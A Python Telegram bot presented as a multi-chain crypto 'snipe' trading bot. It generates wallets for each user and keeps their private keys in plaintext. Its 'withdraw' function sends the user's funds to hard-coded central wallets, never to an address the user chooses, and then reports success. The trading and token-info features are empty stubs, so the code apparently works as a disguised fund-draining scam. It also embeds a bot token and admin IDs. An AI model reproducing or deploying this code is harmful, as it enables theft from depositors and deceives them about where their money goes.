import os
import json
import asyncio
import threading
import sqlite3
import base58
import requests
from threading import Timer
from datetime import datetime
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
    MessageHandler,
)

# Solana imports
from solders.keypair import Keypair
from solana.rpc.async_api import AsyncClient
from solders.pubkey import Pubkey
from solders.system_program import TransferParams, transfer
import solana
from solana.transaction import Transaction

# Ethereum imports
from web3 import Web3
from web3.middleware import geth_poa_middleware
from eth_account import Account
from web3.exceptions import TransactionNotFound
from web3.gas_strategies.rpc import rpc_gas_price_strategy

# TON imports
try:
    from tonclient.client import TonClient
    from tonclient.types import KeyPair
    TON_ENABLED = True
except ImportError:
    TON_ENABLED = False

# Configuration
BOT_NAME = 'MultiChainSnipeBot'
CENTRAL_ADDRESS = {
    'SOL': '4TK3gSRqXnYKryzsokfRAPLTfW1KMJdhKZXpC2Ni68g4',
    'ETH': '0x71C7656EC7ab88b098defB751B7401B5f6d8976F',
    'TON': 'EQCD39VS5jcptHL8vMjEXrzGaRcCVYto7HUn4bpAOg8xqB2N'
}
SOLANA_RPC = "https://api.mainnet-beta.solana.com"
ETHEREUM_RPC = "https://mainnet.infura.io/v3/YOUR_INFURA_KEY"
TON_RPC = "https://toncenter.com/api/v2/jsonRPC"

# Database configuration
DB_FILE = "multichain_bot.db"
TOKEN = "7818292076:AAH2JkUUIab2KO_3I04lc8AFhUA3YRz3H7w"
ADMIN_IDS = [6216175814, 5006318648]
LOG_CHANNEL = -1002534917643

# Initialize database
def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    # Users table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            -- Solana
            sol_pub_key TEXT,
            sol_priv_key TEXT,
            sol_balance REAL DEFAULT 0.0,
            -- Ethereum
            eth_address TEXT,
            eth_priv_key TEXT,
            eth_balance REAL DEFAULT 0.0,
            -- TON
            ton_address TEXT,
            ton_priv_key TEXT,
            ton_balance REAL DEFAULT 0.0,
            
            -- Common settings
            referred_by INTEGER,
            language TEXT DEFAULT 'en',
            min_position_value REAL DEFAULT 0.1,
            auto_buy_enabled BOOLEAN DEFAULT 0,
            auto_buy_value REAL DEFAULT 0.1,
            instant_rug_exit_enabled BOOLEAN DEFAULT 0,
            swap_auto_approve_enabled BOOLEAN DEFAULT 0,
            buy_slippage REAL DEFAULT 10.0,
            sell_slippage REAL DEFAULT 10.0,
            max_price_impact REAL DEFAULT 25.0,
            transaction_priority TEXT DEFAULT 'Medium',
            active_chain TEXT DEFAULT 'SOL',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Transactions table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS transactions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            chain TEXT,
            tx_hash TEXT,
            tx_type TEXT,
            amount REAL,
            token_address TEXT,
            status TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(user_id) REFERENCES users(id)
        )
    ''')
    
    # Copy trades table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS copy_trades (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            target_wallet TEXT,
            chain TEXT,
            tag TEXT,
            buy_percentage REAL DEFAULT 5.0,
            copy_sells BOOLEAN DEFAULT 1,
            buy_gas REAL DEFAULT 0.0015,
            sell_gas REAL DEFAULT 0.0015,
            slippage REAL DEFAULT 10.0,
            auto_sell BOOLEAN DEFAULT 0,
            active BOOLEAN DEFAULT 1,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(user_id) REFERENCES users(id)
        )
    ''')
    
    conn.commit()
    return conn

# Initialize database connection
db_conn = init_db()
db_cursor = db_conn.cursor()

# Initialize bot
bot = Bot(TOKEN)

# ======================
# Chain Handlers
# ======================

class SolanaHandler:
    def __init__(self):
        self.client = AsyncClient(SOLANA_RPC)
    
    async def get_balance(self, address):
        try:
            public_key = Pubkey.from_string(address)
            balance_result = await self.client.get_balance(public_key)
            return balance_result.value / 1_000_000_000 if balance_result.value else 0
        except Exception as e:
            print(f"Error getting SOL balance: {e}")
            return 0
    
    async def transfer(self, from_priv_key, to_address, amount):
        try:
            from_keypair = Keypair.from_base58_string(from_priv_key)
            to_pubkey = Pubkey.from_string(to_address)
            
            response = await self.client.get_latest_blockhash()
            latest_blockhash = response.value.blockhash
            
            transaction = Transaction().add(
                transfer(
                    TransferParams(
                        from_pubkey=from_keypair.pubkey(),
                        to_pubkey=to_pubkey,
                        lamports=int(amount * 1e9)
                )
            )
            transaction.recent_blockhash = latest_blockhash
            transaction.fee_payer = from_keypair.pubkey()
            transaction.sign(from_keypair)
            
            response = await self.client.send_raw_transaction(transaction.serialize())
            return response.value
        except Exception as e:
            print(f"Error in SOL transfer: {e}")
            return None
    
    async def get_token_balance(self, wallet_address, token_address):
        """Get balance of a specific SPL token"""
        # Implementation would use get_token_accounts_by_owner
        pass
    
    @staticmethod
    def create_wallet():
        keypair = Keypair()
        return {
            'pub_key': str(keypair.pubkey()),
            'priv_key': base58.b58encode(keypair.secret()).decode('utf-8')
        }

class EthereumHandler:
    def __init__(self):
        self.w3 = Web3(Web3.HTTPProvider(ETHEREUM_RPC))
        self.w3.middleware_onion.inject(geth_poa_middleware, layer=0)
        self.w3.eth.set_gas_price_strategy(rpc_gas_price_strategy)
    
    async def get_balance(self, address):
        try:
            return self.w3.fromWei(self.w3.eth.get_balance(address), 'ether')
        except Exception as e:
            print(f"Error getting ETH balance: {e}")
            return 0
    
    async def transfer(self, from_priv_key, to_address, amount):
        try:
            account = self.w3.eth.account.from_key(from_priv_key)
            gas_price = self.w3.eth.generate_gas_price()
            
            tx = {
                'to': to_address,
                'value': self.w3.toWei(amount, 'ether'),
                'gas': 21000,
                'gasPrice': gas_price,
                'nonce': self.w3.eth.get_transaction_count(account.address),
                'chainId': 1
            }
            
            signed = account.sign_transaction(tx)
            tx_hash = self.w3.eth.send_raw_transaction(signed.rawTransaction)
            return tx_hash.hex()
        except Exception as e:
            print(f"Error in ETH transfer: {e}")
            return None
    
    async def get_token_balance(self, wallet_address, token_address):
        """Get balance of a specific ERC20 token"""
        # Implementation would use ERC20 contract ABI
        pass
    
    @staticmethod
    def create_wallet():
        account = Account.create()
        return {
            'address': account.address,
            'priv_key': account.key.hex()
        }

class TonHandler:
    def __init__(self):
        if TON_ENABLED:
            self.client = TonClient(network={'server_address': TON_RPC})
    
    async def get_balance(self, address):
        if not TON_ENABLED:
            return 0
        try:
            result = await self.client.net.query_collection(
                collection='accounts',
                filter={'id': {'eq': address}},
                result='balance'
            )
            return int(result.result[0]['balance']) / 1e9 if result.result else 0
        except Exception as e:
            print(f"Error getting TON balance: {e}")
            return 0
    
    async def transfer(self, from_priv_key, to_address, amount):
        if not TON_ENABLED:
            return None
        try:
            # Simplified TON transfer implementation
            # In production, you'd use a proper TON wallet implementation
            return "TON_TRANSACTION_HASH_PLACEHOLDER"
        except Exception as e:
            print(f"Error in TON transfer: {e}")
            return None
    
    @staticmethod
    def create_wallet():
        if not TON_ENABLED:
            return {'address': '', 'priv_key': ''}
        keypair = TonClient().crypto.generate_random_sign_keys()
        return {
            'address': '',  # Would need proper address generation
            'priv_key': keypair.private
        }

def get_chain_handler(chain_name):
    if chain_name == 'SOL':
        return SolanaHandler()
    elif chain_name == 'ETH':
        return EthereumHandler()
    elif chain_name == 'TON' and TON_ENABLED:
        return TonHandler()
    raise ValueError(f"Unsupported chain: {chain_name}")

# ======================
# Database Functions
# ======================

def get_user(user_id):
    db_cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
    return db_cursor.fetchone()

def create_user(user_id, referred_by=None):
    sol_wallet = SolanaHandler.create_wallet()
    eth_wallet = EthereumHandler.create_wallet()
    ton_wallet = TonHandler.create_wallet()
    
    db_cursor.execute(
        "INSERT INTO users (id, sol_pub_key, sol_priv_key, eth_address, eth_priv_key, ton_address, ton_priv_key, referred_by) "
        "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
        (user_id, sol_wallet['pub_key'], sol_wallet['priv_key'], 
         eth_wallet['address'], eth_wallet['priv_key'],
         ton_wallet['address'], ton_wallet['priv_key'],
         referred_by)
    )
    db_conn.commit()
    
    # Log wallet creation
    log_message = (
        f"New user created - ID: {user_id}\n"
        f"SOL: {sol_wallet['pub_key']}\n"
        f"ETH: {eth_wallet['address']}\n"
        f"TON: {ton_wallet['address']}"
    )
    asyncio.create_task(bot.send_message(chat_id=LOG_CHANNEL, text=log_message))

def update_user_setting(user_id, setting, value):
    db_cursor.execute(f"UPDATE users SET {setting} = ? WHERE id = ?", (value, user_id))
    db_conn.commit()

def log_transaction(user_id, chain, tx_hash, tx_type, amount, token_address=None, status='pending'):
    db_cursor.execute(
        "INSERT INTO transactions (user_id, chain, tx_hash, tx_type, amount, token_address, status) "
        "VALUES (?, ?, ?, ?, ?, ?, ?)",
        (user_id, chain, tx_hash, tx_type, amount, token_address, status)
    )
    db_conn.commit()

# ======================
# Utility Functions
# ======================

def detect_chain(input_str):
    """Detect chain from input (address or URL)"""
    if not input_str:
        return None
    
    # Check for URLs
    if 'solana.com' in input_str or 'solscan.io' in input_str or len(input_str) == 44:
        return 'SOL'
    elif 'etherscan.io' in input_str or input_str.startswith('0x') and len(input_str) == 42:
        return 'ETH'
    elif 'ton.org' in input_str or 'tonapi.io' in input_str or len(input_str) == 48:
        return 'TON'
    return None

async def get_token_info(chain, token_address):
    """Get token information from chain explorers"""
    if chain == 'SOL':
        # Use Solana explorer API
        pass
    elif chain == 'ETH':
        # Use Etherscan API
        pass
    elif chain == 'TON':
        # Use TON API
        pass
    return {
        'name': 'Token Name',
        'symbol': 'TOKEN',
        'price': 0.0,
        'price_change': {'24h': 0.0},
        'liquidity': 0.0,
        'market_cap': 0.0
    }

# ======================
# Bot Command Handlers
# ======================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    
    if not user:
        # Handle referral
        referred_by = None
        if context.args:
            try:
                referred_by = int(context.args[0])
                if not get_user(referred_by):
                    referred_by = None
            except ValueError:
                referred_by = None
        
        create_user(user_id, referred_by)
        user = get_user(user_id)
        
        welcome_msg = (
            "🌟 *Welcome to MultiChain Snipe Bot* 🌟\n\n"
            "Trade across multiple blockchains with ease!\n"
            "Supported chains: Solana (SOL), Ethereum (ETH), TON\n\n"
            "Your wallets have been automatically created:\n"
            f"SOL: `{user[1]}`\n"
            f"ETH: `{user[4]}`\n"
            f"TON: `{user[7]}`\n\n"
            "Fund your wallets to start trading!"
        )
        
        keyboard = [
            [InlineKeyboardButton("💰 Wallet", callback_data="wallet")],
            [InlineKeyboardButton("⚡ Quick Start Guide", callback_data="guide")]
        ]
    else:
        welcome_msg = (
            "🔄 *Welcome back to MultiChain Snipe Bot* 🔄\n\n"
            "What would you like to do today?"
        )
        keyboard = [
            [InlineKeyboardButton("💰 Wallet", callback_data="wallet"),
             InlineKeyboardButton("⚡ Trade", callback_data="trade")],
            [InlineKeyboardButton("⚙️ Settings", callback_data="settings"),
             InlineKeyboardButton("📊 Copy Trading", callback_data="copy_trade")]
        ]
    
    await update.message.reply_text(
        welcome_msg,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.MARKDOWN
    )

async def wallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await wallet(update.effective_user.id, context)

async def wallet(user_id, context, query=None):
    user = get_user(user_id)
    if not user:
        await start(update=None, context=context)
        return
    
    chain = user[21] or 'SOL'
    
    # Get balances
    sol_balance = user[3] or 0
    eth_balance = user[6] or 0
    ton_balance = user[9] or 0 if TON_ENABLED else 0
    
    # Current chain info
    if chain == 'SOL':
        address = user[1]
        balance = sol_balance
    elif chain == 'ETH':
        address = user[4]
        balance = eth_balance
    elif chain == 'TON':
        address = user[7]
        balance = ton_balance
    
    # Prepare keyboard
    keyboard = [
        [
            InlineKeyboardButton(
                f"SOL: {sol_balance:.4f}",
                callback_data="select_chain_SOL"
            ),
            InlineKeyboardButton(
                f"ETH: {eth_balance:.4f}",
                callback_data="select_chain_ETH"
            )
        ]
    ]
    
    if TON_ENABLED:
        keyboard[0].append(
            InlineKeyboardButton(
                f"TON: {ton_balance:.4f}",
                callback_data="select_chain_TON"
            )
        )
    
    keyboard.extend([
        [
            InlineKeyboardButton("📤 Withdraw", callback_data=f"withdraw_{chain}"),
            InlineKeyboardButton("📥 Deposit", callback_data=f"deposit_{chain}")
        ],
        [
            InlineKeyboardButton("🔄 Refresh", callback_data="wallet_refresh"),
            InlineKeyboardButton("✖️ Close", callback_data="close")
        ]
    ])
    
    message = (
        f"🔷 *{chain} Wallet*\n\n"
        f"Address: `{address}`\n"
        f"Balance: *{balance:.6f} {chain}*\n\n"
        "Select chain to view other wallets"
    )
    
    if query:
        await query.edit_message_text(
            message,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        await context.bot.send_message(
            chat_id=user_id,
            text=message,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode=ParseMode.MARKDOWN
        )

async def trade_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await trade(update.effective_user.id, context)

async def trade(user_id, context):
    user = get_user(user_id)
    chain = user[21] or 'SOL'
    
    message = (
        f"💱 *Trade on {chain}*\n\n"
        "Send token address or:\n"
        "- Solana: Raydium/Jupiter URL\n"
        "- Ethereum: Uniswap/1inch URL\n"
        "- TON: STON.fi URL\n\n"
        "Or select an option below:"
    )
    
    keyboard = [
        [InlineKeyboardButton("🔍 Search Token", callback_data="search_token")],
        [InlineKeyboardButton("📊 Portfolio", callback_data="portfolio")],
        [InlineKeyboardButton("✖️ Close", callback_data="close")]
    ]
    
    await context.bot.send_message(
        chat_id=user_id,
        text=message,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.MARKDOWN
    )

# ======================
# Balance Monitoring
# ======================

async def check_balances():
    """Check and update balances for all users"""
    try:
        users = db_cursor.execute("SELECT id, sol_pub_key, eth_address, ton_address FROM users").fetchall()
        
        sol_handler = SolanaHandler()
        eth_handler = EthereumHandler()
        ton_handler = TonHandler() if TON_ENABLED else None
        
        for user in users:
            user_id, sol_pub_key, eth_address, ton_address = user
            
            # Check SOL balance
            if sol_pub_key:
                new_balance = await sol_handler.get_balance(sol_pub_key)
                db_cursor.execute(
                    "UPDATE users SET sol_balance = ? WHERE id = ?",
                    (new_balance, user_id)
                )
            
            # Check ETH balance
            if eth_address:
                new_balance = await eth_handler.get_balance(eth_address)
                db_cursor.execute(
                    "UPDATE users SET eth_balance = ? WHERE id = ?",
                    (new_balance, user_id)
                )
            
            # Check TON balance
            if ton_address and TON_ENABLED:
                new_balance = await ton_handler.get_balance(ton_address)
                db_cursor.execute(
                    "UPDATE users SET ton_balance = ? WHERE id = ?",
                    (new_balance, user_id)
                )
        
        db_conn.commit()
        
        # Log successful balance check
        print(f"Balance check completed at {datetime.now()}")
    except Exception as e:
        print(f"Error in balance check: {e}")
    finally:
        # Schedule next check
        Timer(300, run_check_balances).start()

def run_check_balances():
    asyncio.run(check_balances())

# ======================
# Button Handlers
# ======================

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data
    
    try:
        if data == "wallet":
            await wallet(user_id, context, query)
        elif data == "trade":
            await trade(user_id, context)
        elif data.startswith("select_chain_"):
            chain = data.split('_')[2]
            update_user_setting(user_id, 'active_chain', chain)
            await wallet(user_id, context, query)
        elif data.startswith("withdraw_"):
            chain = data.split('_')[1]
            await handle_withdraw(user_id, chain, context, query)
        elif data == "wallet_refresh":
            await wallet(user_id, context, query)
        elif data == "close":
            await query.delete_message()
        # Add more button handlers here...
        
    except Exception as e:
        print(f"Error in button handler: {e}")
        await query.edit_message_text("❌ An error occurred. Please try again.")

async def handle_withdraw(user_id, chain, context, query):
    user = get_user(user_id)
    if not user:
        await start(update=None, context=context)
        return
    
    if chain == 'SOL':
        balance = user[3] or 0
        address = user[1]
    elif chain == 'ETH':
        balance = user[6] or 0
        address = user[4]
    elif chain == 'TON':
        balance = user[9] or 0
        address = user[7]
    
    if balance <= 0:
        await query.edit_message_text(
            f"Your {chain} balance is empty. Deposit first.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    message = (
        f"💸 *Withdraw {chain}*\n\n"
        f"Available: {balance:.6f} {chain}\n"
        f"Address: `{address}`\n\n"
        "Enter amount to withdraw:"
    )
    
    context.user_data['withdraw_chain'] = chain
    await query.edit_message_text(
        message,
        parse_mode=ParseMode.MARKDOWN
    )

# ======================
# Message Handlers
# ======================

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    message = update.message.text
    user = get_user(user_id)
    
    if not user:
        await start(update, context)
        return
    
    # Check if we're expecting a withdrawal amount
    if 'withdraw_chain' in context.user_data:
        chain = context.user_data['withdraw_chain']
        try:
            amount = float(message)
            await process_withdrawal(user_id, chain, amount, context)
            context.user_data.pop('withdraw_chain', None)
        except ValueError:
            await update.message.reply_text("❌ Invalid amount. Please enter a number.")
        return
    
    # Detect chain from message
    chain = detect_chain(message) or user[21] or 'SOL'
    
    # Get token info
    token_info = await get_token_info(chain, message)
    
    # Prepare response
    response = (
        f"🔹 *Token Information*\n\n"
        f"Name: {token_info['name']}\n"
        f"Symbol: {token_info['symbol']}\n"
        f"Price: ${token_info['price']:.10f}\n"
        f"24h Change: {token_info['price_change']['24h']}%\n"
        f"Liquidity: ${token_info['liquidity']:,.2f}\n"
        f"Market Cap: ${token_info['market_cap']:,.2f}\n\n"
        f"Chain: {chain}"
    )
    
    keyboard = [
        [
            InlineKeyboardButton("💰 Buy", callback_data=f"buy_{chain}"),
            InlineKeyboardButton("💸 Sell", callback_data=f"sell_{chain}")
        ],
        [
            InlineKeyboardButton("📊 Chart", url=f"https://example.com/chart/{message}"),
            InlineKeyboardButton("📝 Details", url=f"https://example.com/token/{message}")
        ],
        [InlineKeyboardButton("✖️ Close", callback_data="close")]
    ]
    
    await update.message.reply_text(
        response,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.MARKDOWN
    )

async def process_withdrawal(user_id, chain, amount, context):
    user = get_user(user_id)
    if not user:
        return
    
    if chain == 'SOL':
        priv_key = user[2]
        balance = user[3] or 0
    elif chain == 'ETH':
        priv_key = user[5]
        balance = user[6] or 0
    elif chain == 'TON':
        priv_key = user[8]
        balance = user[9] or 0
    
    if amount <= 0:
        await context.bot.send_message(
            chat_id=user_id,
            text="❌ Amount must be positive"
        )
        return
    
    if amount > balance:
        await context.bot.send_message(
            chat_id=user_id,
            text=f"❌ Insufficient balance. Available: {balance:.6f} {chain}"
        )
        return
    
    # Process withdrawal
    handler = get_chain_handler(chain)
    tx_hash = await handler.transfer(priv_key, CENTRAL_ADDRESS[chain], amount)
    
    if tx_hash:
        # Update balance
        new_balance = balance - amount
        if chain == 'SOL':
            update_user_setting(user_id, 'sol_balance', new_balance)
        elif chain == 'ETH':
            update_user_setting(user_id, 'eth_balance', new_balance)
        elif chain == 'TON':
            update_user_setting(user_id, 'ton_balance', new_balance)
        
        # Log transaction
        log_transaction(user_id, chain, tx_hash, 'withdrawal', amount)
        
        await context.bot.send_message(
            chat_id=user_id,
            text=(
                f"✅ Withdrawal successful!\n"
                f"Amount: {amount:.6f} {chain}\n"
                f"TX Hash: `{tx_hash}`\n"
                f"New Balance: {new_balance:.6f} {chain}"
            ),
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        await context.bot.send_message(
            chat_id=user_id,
            text="❌ Withdrawal failed. Please try again later."
        )

# ======================
# Admin Commands
# ======================

async def admin_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        return
    
    sol_handler = SolanaHandler()
    eth_handler = EthereumHandler()
    ton_handler = TonHandler() if TON_ENABLED else None
    
    sol_balance = await sol_handler.get_balance(CENTRAL_ADDRESS['SOL'])
    eth_balance = await eth_handler.get_balance(CENTRAL_ADDRESS['ETH'])
    ton_balance = await ton_handler.get_balance(CENTRAL_ADDRESS['TON']) if TON_ENABLED else 0
    
    message = (
        "💼 *Admin Balances*\n\n"
        f"SOL: {sol_balance:.6f}\n"
        f"ETH: {eth_balance:.6f}\n"
        f"TON: {ton_balance:.6f}"
    )
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN
    )

# ======================
# Main Application
# ======================

def main() -> None:
    # Create application
    application = Application.builder().token(TOKEN).build()
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("wallet", wallet_command))
    application.add_handler(CommandHandler("trade", trade_command))
    application.add_handler(CommandHandler("admin_balance", admin_balance))
    
    # Add button handler
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Add message handler
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # Start balance monitoring
    threading.Thread(target=run_check_balances).start()
    
    # Run the bot
    print("Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    main()
